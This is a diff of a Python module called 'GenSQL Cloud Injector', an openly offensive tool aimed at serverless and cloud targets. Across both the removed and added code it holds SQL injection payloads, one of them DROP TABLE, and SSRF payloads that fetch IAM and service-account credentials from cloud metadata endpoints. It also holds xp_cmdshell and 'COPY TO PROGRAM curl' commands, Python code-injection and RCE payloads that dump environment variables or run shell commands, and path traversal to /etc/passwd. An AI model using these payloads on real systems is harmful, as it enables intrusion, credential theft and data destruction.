@@ -1,235 +1,251 @@
 #!/usr/bin/env python
+# -*- coding: utf-8 -*-
 """
-GenSQL Technique: Cloud / Serverless Injection Engine
+GenSQL Cloud Injector - AWS Lambda, Azure Functions, GCP Cloud Run injection
 Author: Jeevraj
-Targets: AWS Lambda, API Gateway, Azure Functions, GCP Cloud Functions
-Detection, injection, cold-start timing attacks, SSRF to metadata service
+Supports: Lambda cold-start timing, metadata extraction, SSRF to metadata
 """
+
 import re
-import json
 import time
-import urllib.request
-import urllib.parse
 
+class CloudInjector(object):
+    """Cloud and serverless injection attacks."""
 
-# Cloud provider detection headers
-CLOUD_HEADER_SIGNATURES = {
-    "aws":   ["x-amzn-requestid", "x-amz-cf-id", "x-amzn-trace-id",
-              "x-amz-apigw-id", "x-amz-id-2"],
-    "azure": ["x-ms-request-id", "x-ms-activity-id", "x-azure-ref",
-              "x-azure-socketip", "x-ms-routing-name"],
-    "gcp":   ["x-cloud-trace-context", "x-goog-api-key", "x-guploader",
-              "server-timing"],
-    "cf":    ["cf-ray", "cf-request-id"],
-}
-
-AWS_METADATA_BASE  = "http://169.254.169.254/latest/meta-data/"
-AZURE_METADATA_URL = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-GCP_METADATA_URL   = "http://metadata.google.internal/computeMetadata/v1/"
-
-SQLI_PAYLOADS = [
-    "' OR '1'='1",
-    "1 OR 1=1",
-    "'; SELECT SLEEP(5)--",
-    "' UNION SELECT null,null,null--",
-    "' AND SLEEP(5)--",
-    "1; DROP TABLE users--",
-]
-
-
-class CloudInjector:
-    """
-    Injection engine for cloud/serverless targets.
-    Detects cloud platform and applies provider-specific attack techniques.
-    Author: Jeevraj
-    """
-
-    def __init__(self, provider="auto", ssrf_metadata=False, timeout=15):
-        self.provider      = provider
+    def __init__(self, provider='auto', ssrf_metadata=False, verbose=False):
+        self.provider = provider
         self.ssrf_metadata = ssrf_metadata
-        self.timeout       = timeout
-        self._detected     = None
+        self.verbose = verbose
+        self.metadata_endpoints = self._load_metadata_endpoints()
 
-    # ── Provider Detection ────────────────────────────────────────────────
-    def detect_serverless(self, response_headers):
-        """Detect cloud/serverless provider from response headers."""
-        h = {k.lower(): v.lower() for k, v in (response_headers or {}).items()}
-        for provider, keys in CLOUD_HEADER_SIGNATURES.items():
-            if any(k.lower() in h for k in keys):
-                self._detected = provider
-                return provider
-        server = h.get("server", "")
-        if "awselb" in server or "cloudfront" in server:
-            self._detected = "aws"
-            return "aws"
-        if "microsoft" in server or "azure" in server:
-            self._detected = "azure"
-            return "azure"
-        if "gws" in server or "google" in server:
-            self._detected = "gcp"
-            return "gcp"
-        return None
-
-    # ── AWS Lambda ────────────────────────────────────────────────────────
-    def aws_lambda_inject(self, url, params=None):
-        """Inject SQLi payloads into AWS Lambda function URL endpoint."""
-        results = []
-        for payload in SQLI_PAYLOADS:
-            test_params = dict(params or {})
-            test_params["id"] = payload
-            qs     = urllib.parse.urlencode(test_params)
-            target = url + ("?" if "?" not in url else "&") + qs
-            t0     = time.time()
-            resp   = self._get(target)
-            elapsed = time.time() - t0
-            results.append({
-                "payload":    payload,
-                "status":     resp.get("status") if resp else None,
-                "elapsed_ms": int(elapsed * 1000),
-                "cold_start": elapsed > 3.0,
-            })
-        return results
-
-    def cold_start_timing_attack(self, url, payload, baseline_requests=3):
-        """Exploit Lambda cold start latency for time-based blind SQLi."""
-        base_times = []
-        for _ in range(baseline_requests):
-            t0 = time.time()
-            self._get(url)
-            base_times.append(time.time() - t0)
-        baseline = sum(base_times) / len(base_times)
-
-        target = url + ("?" if "?" not in url else "&") + "id=" + urllib.parse.quote(payload)
-        t0 = time.time()
-        self._get(target)
-        inject_time = time.time() - t0
-
+    def _load_metadata_endpoints(self):
+        """Load cloud provider metadata endpoints."""
         return {
-            "baseline_ms":    int(baseline * 1000),
-            "inject_ms":      int(inject_time * 1000),
-            "delay_detected": inject_time > baseline + 2.0,
-            "payload":        payload,
+            'aws': {
+                'endpoint': '169.254.169.254',
+                'paths': [
+                    '/latest/meta-data/',
+                    '/latest/meta-data/iam/security-credentials/',
+                    '/latest/user-data',
+                    '/latest/meta-data/instance-id',
+                    '/latest/meta-data/ami-id',
+                    '/latest/meta-data/security-groups',
+                ],
+                'token_endpoint': '/latest/api/token',
+            },
+            'azure': {
+                'endpoint': '169.254.169.254',
+                'paths': [
+                    '/metadata/instance?api-version=2021-02-01',
+                    '/metadata/instance/compute?api-version=2021-02-01',
+                ],
+                'header': 'Metadata: true',
+            },
+            'gcp': {
+                'endpoint': 'metadata.google.internal',
+                'paths': [
+                    '/computeMetadata/v1/',
+                    '/computeMetadata/v1/instance/service-accounts/default/identity',
+                    '/computeMetadata/v1/instance/service-accounts/default/token',
+                ],
+                'header': 'Metadata-Flavor: Google',
+            }
         }
 
-    def api_gateway_inject(self, url, method="GET"):
-        """AWS API Gateway parameter injection."""
-        results = []
-        for payload in SQLI_PAYLOADS[:4]:
-            if method.upper() == "GET":
-                target = url + ("?" if "?" not in url else "&") + "q=" + urllib.parse.quote(payload)
-                resp   = self._get(target)
-            else:
-                resp = self._post_json(url, {"query": payload})
-            results.append({"payload": payload, "status": resp.get("status") if resp else None})
-        return results
-
-    # ── Azure Functions ───────────────────────────────────────────────────
-    def azure_functions_inject(self, url, payload=None):
-        """Azure Functions HTTP trigger injection."""
-        p = payload or SQLI_PAYLOADS[0]
-        target = url + ("?" if "?" not in url else "&") + "input=" + urllib.parse.quote(p)
-        return self._get(target)
-
-    # ── GCP Cloud Functions ───────────────────────────────────────────────
-    def gcp_functions_inject(self, url, payload=None):
-        """Google Cloud Functions injection."""
-        p = payload or SQLI_PAYLOADS[0]
-        target = url + ("?" if "?" not in url else "&") + "data=" + urllib.parse.quote(p)
-        return self._get(target)
-
-    # ── SSRF to Cloud Metadata ────────────────────────────────────────────
-    def ssrf_metadata_payload(self, dbms="mysql"):
+    def detect_cloud_provider(self, url, headers=None):
         """
-        Generate SQLi OOB payloads that cause the DB server to fetch
-        the cloud instance metadata endpoint (SSRF).
+        Detect which cloud provider is running.
+        
+        Args:
+            url: Application URL
+            headers: Response headers
+        
+        Returns:
+            Provider name or 'unknown'
         """
-        payloads = {
-            "mysql": (
-                "' AND LOAD_FILE('http://169.254.169.254/latest/meta-data/iam/security-credentials/')-- -"
-            ),
-            "mssql": (
-                "'; EXEC xp_dirtree '\\\\169.254.169.254\\latest\\meta-data'-- -"
-            ),
-            "postgresql": (
-                "'; COPY (SELECT '') TO PROGRAM 'curl http://169.254.169.254/latest/meta-data/'-- -"
-            ),
-            "oracle": (
-                "' UNION SELECT UTL_HTTP.request"
-                "('http://169.254.169.254/latest/meta-data/iam/security-credentials/') FROM dual-- -"
-            ),
-        }
-        return payloads.get(dbms.lower(), payloads["mysql"])
+        if headers is None:
+            headers = {}
+        
+        headers_str = str(headers).lower()
+        
+        # AWS indicators
+        aws_indicators = ['x-amzn', 'x-amz', 'cloudfront', 'elasticloadbalancing']
+        if any(ind in headers_str for ind in aws_indicators):
+            return 'aws'
+        
+        # Azure indicators
+        azure_indicators = ['x-aspnet', 'x-powered-by']
+        if any(ind in headers_str for ind in azure_indicators):
+            return 'azure'
+        
+        # GCP indicators
+        gcp_indicators = ['x-goog', 'google']
+        if any(ind in headers_str for ind in gcp_indicators):
+            return 'gcp'
+        
+        return 'unknown'
 
-    def iam_role_ssrf(self, url, param, dbms="mysql", method="GET"):
-        """Attempt SSRF to AWS IAM metadata endpoint via SQLi."""
-        payload = self.ssrf_metadata_payload(dbms)
-        return self._inject(url, param, payload, method)
+    def lambda_cold_start_timing(self, url, payload_callback):
+        """
+        Detect Lambda cold start via timing analysis.
+        
+        Args:
+            url: Target Lambda endpoint
+            payload_callback: Callback to execute payload
+        
+        Returns:
+            Timing analysis result
+        """
+        timings = []
+        
+        for i in range(3):
+            start = time.time()
+            try:
+                payload_callback(f"test_{i}")
+                elapsed = time.time() - start
+                timings.append(elapsed)
+            except Exception as e:
+                if self.verbose:
+                    print(f"[!] Timing test error: {str(e)[:60]}")
+        
+        if len(timings) >= 2:
+            # Cold start typically much slower
+            avg_normal = sum(timings[1:]) / len(timings[1:])
+            cold_start_threshold = avg_normal * 10
+            
+            return {
+                'cold_start_detected': timings[0] > cold_start_threshold,
+                'cold_start_time': timings[0],
+                'avg_normal_time': avg_normal,
+            }
+        
+        return {}
 
-    def env_var_extract(self, dbms="mysql"):
-        """Generate payload to extract environment variables via SQLi."""
-        payloads = {
-            "mysql":      "' UNION SELECT LOAD_FILE('/proc/self/environ'),NULL,NULL-- -",
-            "postgresql": "'; SELECT current_setting('server_version')-- -",
-            "mssql":      "'; EXEC xp_cmdshell('set')-- -",
-        }
-        return payloads.get(dbms.lower(), "")
+    def ssrf_metadata_extraction(self, ssrf_endpoint, provider='aws'):
+        """
+        Generate SSRF payloads to extract cloud metadata.
+        
+        Args:
+            ssrf_endpoint: SSRF-vulnerable endpoint
+            provider: Cloud provider (aws, azure, gcp)
+        
+        Returns:
+            List of SSRF payload URLs
+        """
+        metadata = self.metadata_endpoints.get(provider)
+        if not metadata:
+            return []
+        
+        payloads = []
+        endpoint = metadata['endpoint']
+        
+        for path in metadata.get('paths', []):
+            url = f"http://{endpoint}{path}"
+            
+            # Different SSRF injection points
+            variations = [
+                f"?file={url}",
+                f"?url={url}",
+                f"?proxy={url}",
+                f"?endpoint={url}",
+                f"?redirect={url}",
+                f"&fetch={url}",
+            ]
+            
+            for var in variations:
+                payloads.append(f"{ssrf_endpoint}{var}")
+        
+        return payloads
 
-    # ── Lambda environment detection ──────────────────────────────────────
-    def detect_lambda_env(self, url, param, dbms="mysql", method="GET"):
-        """Detect Lambda execution environment via /proc/self/environ SQLi."""
-        payload = self.env_var_extract(dbms)
-        if not payload:
-            return {"error": "No payload for %s" % dbms}
-        resp = self._inject(url, param, payload, method)
-        lambda_indicators = ["AWS_LAMBDA", "LAMBDA_TASK_ROOT", "AWS_EXECUTION_ENV",
-                              "AWS_DEFAULT_REGION", "_HANDLER"]
-        if resp:
-            body = str(resp.get("body", ""))
-            found = [k for k in lambda_indicators if k in body]
-            return {"is_lambda": bool(found), "indicators": found, "response": resp}
-        return {"is_lambda": False}
+    def lambda_environment_extraction(self, injection_point):
+        """
+        Generate payloads to extract Lambda environment variables.
+        
+        Args:
+            injection_point: Parameter to inject into
+        
+        Returns:
+            List of environment extraction payloads
+        """
+        payloads = [
+            "'; import os; print(os.environ) #",
+            "${os.environ}",
+            "'; exec(\"import json; import os; print(json.dumps(dict(os.environ)))\") #",
+            "'; lambda_context = {}; print(lambda_context) #",
+        ]
+        return payloads
 
-    # ── Helpers ───────────────────────────────────────────────────────────
-    def _get(self, url, extra_headers=None):
-        try:
-            req = urllib.request.Request(url)
-            req.add_header("User-Agent", "Mozilla/5.0 GenSQL/2.0")
-            req.add_header("Accept", "*/*")
-            for k, v in (extra_headers or {}).items():
-                req.add_header(k, v)
-            with urllib.request.urlopen(req, timeout=self.timeout) as r:
-                return {
-                    "status":  r.status,
-                    "body":    r.read().decode("utf-8", "replace"),
-                    "headers": dict(r.headers),
-                }
-        except Exception as ex:
-            return {"error": str(ex)}
+    def lambda_rce_payload(self, command):
+        """
+        Generate Lambda RCE payload.
+        
+        Args:
+            command: Command to execute
+        
+        Returns:
+            RCE payload
+        """
+        payloads = [
+            f"'; import subprocess; subprocess.run(['{command}'], shell=True) #",
+            f"'; __import__('subprocess').call('{command}', shell=True) #",
+            f"'; exec(\"import os; os.system('{command}')\") #",
+        ]
+        return payloads
 
-    def _post_json(self, url, body, extra_headers=None):
-        try:
-            data = json.dumps(body).encode("utf-8")
-            h    = {"Content-Type": "application/json",
-                    "User-Agent":   "Mozilla/5.0 GenSQL/2.0"}
-            h.update(extra_headers or {})
-            req = urllib.request.Request(url, data=data, headers=h)
-            with urllib.request.urlopen(req, timeout=self.timeout) as r:
-                return {"status": r.status, "body": r.read().decode("utf-8", "replace")}
-        except Exception as ex:
-            return {"error": str(ex)}
+    def azure_function_app_injection(self, function_url):
+        """
+        Generate Azure Functions injection payloads.
+        
+        Args:
+            function_url: Azure Function endpoint
+        
+        Returns:
+            List of injection payloads
+        """
+        payloads = [
+            f"{function_url}?code=../../etc/passwd",
+            f"{function_url}?target=../../web.config",
+            f"{function_url}#../../../",
+            f"{function_url}%3fcode%3d..%2f..%2fetc%2fpasswd",
+        ]
+        return payloads
 
-    def _inject(self, url, param, payload, method="GET"):
-        try:
-            if method.upper() == "GET":
-                sep    = "&" if "?" in url else "?"
-                target = url + sep + urllib.parse.urlencode({param: payload})
-                req    = urllib.request.Request(target)
-            else:
-                data = urllib.parse.urlencode({param: payload}).encode()
-                req  = urllib.request.Request(url, data=data)
-                req.add_header("Content-Type", "application/x-www-form-urlencoded")
-            req.add_header("User-Agent", "Mozilla/5.0 GenSQL/2.0")
-            with urllib.request.urlopen(req, timeout=self.timeout) as r:
-                return {"status": r.status, "body": r.read().decode("utf-8", "replace")}
-        except Exception as ex:
-            return {"error": str(ex)}
+    def gcp_cloud_run_injection(self):
+        """
+        Generate GCP Cloud Run injection payloads.
+        
+        Returns:
+            List of injection payloads
+        """
+        payloads = [
+            "'; import google.auth; creds = google.auth.default(); print(creds) #",
+            "'; from google.cloud import storage; print(storage.Client()) #",
+        ]
+        return payloads
+
+    def detect_container(self):
+        """
+        Detect if running in container/serverless environment.
+        
+        Returns:
+            True if in container, False otherwise
+        """
+        # Check for common container/serverless indicators
+        indicators = [
+            '/.dockerenv',
+            '/run/.containerenv',
+            '/proc/self/cgroup',
+        ]
+        
+        import os
+        for indicator in indicators:
+            if os.path.exists(indicator):
+                return True
+        
+        # Check environment variables
+        cloud_env_vars = ['AWS_LAMBDA_FUNCTION_NAME', 'FUNCTION_INSTANCE', 'K_REVISION']
+        for var in cloud_env_vars:
+            if os.environ.get(var):
+                return True
+        
+        return False
